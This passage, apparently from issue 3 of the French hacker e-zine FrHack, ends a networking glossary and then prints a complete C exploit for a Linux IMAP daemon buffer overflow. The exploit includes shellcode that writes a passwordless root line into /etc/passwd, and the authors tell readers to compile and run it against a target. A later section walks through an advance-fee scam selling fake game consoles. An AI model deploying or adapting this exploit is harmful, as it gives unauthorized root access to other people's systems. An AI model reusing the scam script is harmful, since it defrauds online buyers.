bases de données référençant les ressources accessibles                     au travers d'Internet.

* WAN :
- Acronyme de "Wide Area Network", ce qui se traduit par réseau informatique à longues 
distances. 0n classe dans la catégorie des WAN tous les réseaux informatiques publics ou privés 
qui permettent d'échanger des données sur des                     dizaines de kilomètres et qui sont 
susceptibles d'accepter une extension de leur couverture par l'adjonction de nouvelles portions 
de réseau.

* WinSock :
- Windows Socket, une API (Application Programming Interface) permettant de faire fonctionner 
des applications Windows sur un réseau TCP/IP.

* World Wide Web (WWW ou W3) :
- On regroupe sous cette expression tous les serveurs contenant des documents HTML . En 
raison des liens hypertextes (v.) que contiennent ces derniers, ces serveurs constituent une 
gigantesque "toile d'araignée" numérique de couverture                    mondiale.


@ X @

Aucune définition disponible 

@ Y @

Aucune définition disponible 

@ Z @

Aucune définition disponible 



=== Petit mot de la fin de l'auteur  ===

Bon.. et bien après 10 Sprite©, 6 packs de 12 Export©, pis 2 pizzas (1 au jambon, l'autre au 
pepperoni), je réussi enfin a finir mon glossaire. Je remercie Dieu (pffff t'en collerais une moi de 
Dieu *&?*(& ;), ma mère, sans qui je serais pas là, mon ordi, sans qui et je dis bien "qui" et pas 
"quoi", sans qui je n'aurais pu écrire cet article et enfin, mes chats pour m'avoir dormis en pleine 
face.
Bonne année ( on est le 6 janvier, c'est toujours de rigueur ) et a ciao.

The FrHack Crew
Gabber

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Bug du démon Imap



Bonjour, j'ai récemment trouvé sur internet (sur ma disquette plutôt) [ Huh ?!?]
un exploit concernant le hole dans du démon imap de Linux.  Le code plus bas ouvre,
/etc/passwd ( changez le pour /etc/shadow au besoin ). Le probleme c'est que ca
remplace la premiere ligne du /etc/shadow, ce qui fait donc perdre le root passwd,
mais vu qu'on est là pour le hacker, on s'en fou. Compiler ca dans le style gcc -o imap imap.c, 
exécutez-le ( ./imap) et le tour est joué. Vous avez sans doute remarquer que pour runner ca sur 
une box, ca serais un atout d'avoir déjà un account dessus non ? Bon, alors essayer ça et 
amusez-vous. 

  
*/

#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netdb.h>

char *h_to_ip(char *hostname);

char *h_to_ip(char *hostname) {

  struct hostent *h;
  struct sockaddr_in tmp;
  struct in_addr in;

  h = gethostbyname(hostname);

  if (h==NULL) { perror("Resolving the host. \n"); exit(-1); }

  memcpy((caddr_t)&tmp.sin_addr.s_addr, h->h_addr, h->h_length);
  memcpy(&in,&tmp.sin_addr.s_addr,4);

return(inet_ntoa(in));
}

void banner(void) {
  system("clear");
  printf("\nIMAP Exploit for Linux.\n");
  printf("\n\tAuthor: Akylonius (aky@galeb.etf.bg.ac.yu)\n");
  printf(" Modifications: ASHMEU (ashmeu@godzworld.com)\n");
}

main(int argc, char **argv) {

  int fd;
  struct sockaddr_in sckdaddr;
  char *hostname;
  char buf[4092];
  int i=8;
  char realegg[] =
    "\xeb\x58\x5e"
    "\x31\xdb\x83\xc3\x08\x83\xc3\x02\x88\x5e\x26"
    "\x31\xdb\x83\xc3\x23\x83\xc3\x23\x88\x5e\xa8"
    "\x31\xdb\x83\xc3\x26\x83\xc3\x30\x88\x5e\xc2"
    "\x31\xc0\x88\x46\x0b\x89\xf3\x83\xc0\x05\x31"
    "\xc9\x83\xc1\x01\x31\xd2\xcd\x80\x89\xc3\x31"
    "\xc0\x83\xc0\x04\x31\xd2\x88\x56\x27\x89\xf1"
    "\x83\xc1\x0c\x83\xc2\x1b\xcd\x80\x31\xc0\x83"
    "\xc0\x06\xcd\x80\x31\xc0\x83\xc0\x01\xcd\x80"
    "iamaselfmodifyingmonsteryeahiam\xe8\x83\xff\xff\xff"
    "/etc/passwdxroot::0:0:r00t:/:/bin/bashx";
  char *point = realegg;
  buf[0]='*';
  buf[1]=' ';
  buf[2]='l';
  buf[3]='o';
  buf[4]='g';
  buf[5]='i';
  buf[6]='n';
  buf[7]=' ';

  banner();

  if (argc<2)  {
     printf("\nUsage: %s <hostname>\n\n", argv[0]);
     exit(-1);
  }

  hostname=argv[1];

  while(i<1034-sizeof(realegg) -1) /* -sizeof(realegg)+1) */
    buf[i++]=0x90;

  while(*point)
    buf[i++]=*(point++);

  buf[i++]=0x83; /* ebp */
  buf[i++]=0xf3;
  buf[i++]=0xff;
  buf[i++]=0xbf;
  buf[i++]=0x88; /* ret adr */
  buf[i++]=0xf8;
  buf[i++]=0xff;
  buf[i++]=0xbf;

  buf[i++]=' ';
  buf[i++]='b';
  buf[i++]='a';
  buf[i++]='h';
  buf[i++]='\n';

  buf[i++]=0x0;


  if ((fd=socket(AF_INET,SOCK_STREAM,0))<0) perror("Error opening the
socket. \n");

  sckdaddr.sin_port=htons(143);
  sckdaddr.sin_family=AF_INET;
  sckdaddr.sin_addr.s_addr=inet_addr(h_to_ip(hostname));

  if (connect(fd,(struct sockaddr *) &sckdaddr, sizeof(sckdaddr)) < 0)
perror("Error with connecting. \n");

  printf("hmm: \n");
  getchar();
  write(fd,buf,strlen(buf)+1);
  printf("hmm: \n");
  close(fd);
}

/*   PiCK The PoWeR aT http://www.godzworld.com
 The FrHack Crew
Ashmeu

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Comment se faire de l'argent sur Internet ?


Ce texte n'a été rédigé qu'à titre d'information.

1) Internet: lieu d'échanges...

Internet est un lieu d'échanges, ou tout se vends et tout ce trouve. Admettons qu'un personne X
veuille vendre des "fausses" consoles de jeux par exemple. Il lui suffit de poster des annonces 
sur des sites tel que www.jeuxvideo.com, et il recevra des réponses très rapidement.
Admettons que cette personne X trouve un "client" ou plutôt un "pigeon".
La personne X donnera le prix de la console qu'elle désire vendre, et se débrouillera pour que 
le "client" soit intéressé par l'offre.
Voici un exemple:
Une personne X veut gagner de l'argent facilement, elle prétend vendre des consoles de jeux et 
poste des annonces sur www.jeuxvideo.com.
Une personne Y lui répond et lui demande comment faire pour le payement.
La personne X répond qu'elle envoie la console en contre remboursement, mais qu'il faut que la 
personne Y paye les frais de port en avance.
La personne X a un compte en banque et donne ses coordonnées a la personne Y.
La personne Y met la somme que représente les frais de port (disons 250 fr).
La personne X disparaît, la personne X a gagné 250 fr...
Grâce à Internet, des escroc peuvent librement s'enrichir puisque lors de ventes, il
n'existe aucun contrat pour la vente et souvent aucun renseignement sur le vendeur.

2) Les internautes, tous des pigeons ?

Non bien sur, nous ne sommes pas tous des pigeons, mais les escroc se débrouilleront toujours
pour trouver la cible idéale...
Un conseil tout de même, faite comme moi: N'achetez rien sur Internet...


Collaborateur de FrHack
|Pr0tek|

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Conclusion

Nous espérons que vous avez apprécié le troisième Emag de FrHack et nous comptons en sortir 
un quatrième dès la mi-février. Je tiens à remercier tous les supporteurs de FrHack, tous les 
membres et tous ceux qui m'ont aidé pour la publication de ce Emag. Je remercie également 
tous les hackers, phone phreak, crackeur et codeurs qui continue sans cesse de faire leur beau 
boulot. Remerciement spécial à:
-Oktober notre guru de linux préféré, qui a également faite la page web de FrHack.
-ASHMEU qui, avec ses talents en français à corriger le Emag.
-Le monde qui fréquente le channel irc #hack.fr pour m'avoir fournit le support moral et la 
conviction que je ne faisais pas ca pour rien.
-Buble et Kthulu d'être apparu en plein au bon moment ;-)

Pour vos questions, commentaires et suggestions : FrHack@hotmail.com

Snowcrach et l'équipe de FrHack
